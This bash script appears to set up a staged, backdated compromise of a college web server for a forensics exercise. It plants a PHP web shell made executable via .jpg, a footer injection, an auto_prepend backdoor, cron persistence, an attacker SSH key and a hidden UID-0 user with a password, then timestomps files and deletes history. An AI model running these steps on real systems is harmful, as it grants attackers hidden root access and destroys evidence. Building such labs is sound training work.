#!/bin/bash
set -euo pipefail

A=/tmp/setup/attack
SITE=/var/www/college.example.org
UP=$SITE/public/uploads

install -D -m 644 -o www-data -g www-data "$A/scan_0412.php" "$UP/2026/10/scan_0412.php"

install -m 644 -o www-data -g www-data "$A/staff-photo.jpg" "$UP/staff-photo.jpg"
install -m 644 -o www-data -g www-data "$A/uploads.htaccess" "$UP/.htaccess"
sed -i 's|^;security.limit_extensions = .*|security.limit_extensions = .php .jpg|' /etc/php/8.3/fpm/pool.d/www.conf
grep -q '^security.limit_extensions = .php .jpg$' /etc/php/8.3/fpm/pool.d/www.conf

cat "$A/footer-inject.txt" "$SITE/includes/footer.php" > /tmp/footer.new
cat /tmp/footer.new > "$SITE/includes/footer.php"
rm -f /tmp/footer.new

install -m 644 -o www-data -g www-data "$A/sess_lock.php" /var/lib/php/sessions/.sess_lock
echo 'auto_prepend_file = /var/lib/php/sessions/.sess_lock' >> "$SITE/public/.user.ini"

install -m 644 "$A/security-headers.conf" /etc/apache2/conf-available/security-headers.conf
a2enconf -q security-headers
install -d -m 755 -o www-data -g www-data /var/tmp/.font-cache
install -m 644 -o www-data -g www-data "$A/status.php" /var/tmp/.font-cache/status.php

php "$A/add-admin.php" "$SITE/database/college.sqlite"

install -d -m 755 -o www-data -g www-data /var/www/.cache
base64 -w0 "$A/scan_0412.php" > /var/www/.cache/.fc
chown www-data:www-data /var/www/.cache/.fc
install -m 600 -o www-data -g crontab "$A/www-data.crontab" /var/spool/cron/crontabs/www-data

cat "$A/attacker.pub" >> /root/.ssh/authorized_keys

useradd -o -u 0 -g 0 -M -d /var/backups -s /bin/bash -c "System Backup" sysbackup
echo 'sysbackup:B4ckup!Srv2026' | chpasswd
python3 - <<'PY'
for path in ("/etc/passwd", "/etc/shadow"):
    with open(path) as f:
        lines = f.read().splitlines()
    extra = [l for l in lines if l.startswith("sysbackup:")]
    rest = [l for l in lines if not l.startswith("sysbackup:")]
    at = next(i for i, l in enumerate(rest) if l.startswith("backup:")) + 1
    with open(path, "w") as f:
        f.write("\n".join(rest[:at] + extra + rest[at:]) + "\n")
PY
rm -f /etc/passwd- /etc/shadow- /etc/group- /etc/gshadow-

python3 /tmp/setup/make_logs.py > /var/log/apache2/access.log
touch /var/log/apache2/error.log
chown root:adm /var/log/apache2/access.log /var/log/apache2/error.log
chmod 640 /var/log/apache2/access.log /var/log/apache2/error.log

BASE='2026-09-20 10:15:00'
find "$SITE" /etc/apache2 /etc/php /etc/cron.d /var/spool/cron /root/.ssh /home/ubuntu /root/handover \
    -exec touch -h -d "$BASE" {} +
touch -d '2026-09-01 08:30:00' "$UP/2026/09/term-dates-2026.pdf"
touch -d '2026-09-08 09:10:00' "$UP/2026/09/fees-structure-2026-2027.pdf"
touch -d '2026-09-22 14:05:00' "$UP/2026/09/tp-allocation-2026.docx" "$UP/2026/09"
touch -d '2026-10-03 16:40:00' "$UP/2026/10/sports-day-2026.jpg" "$UP/staff-photo.jpg"
touch -d '2026-10-12 01:11:40' "$UP/2026/10/scan_0412.php" "$UP/2026/10"
touch -d '2026-10-12 01:33:05' "$UP/.htaccess" "$UP"
touch -d '2026-10-12 01:41:09' "$SITE/database/college.sqlite" "$SITE/database"
touch -d '2026-10-12 01:47:22' /var/lib/php/sessions/.sess_lock
touch -d '2026-10-12 01:52:31' /var/www/.cache/.fc /var/www/.cache /var/spool/cron/crontabs/www-data
touch -d '2026-10-12 01:56:10' /etc/passwd /etc/shadow
touch -d '2026-10-12 01:58:47' /root/.ssh/authorized_keys
touch -d '2026-10-12 02:01:15' /var/tmp/.font-cache/status.php /var/tmp/.font-cache
touch -h -d '2026-09-28 11:02:00' /etc/apache2/conf-available/security-headers.conf \
    /etc/apache2/conf-enabled/security-headers.conf

rm -f /root/.bash_history
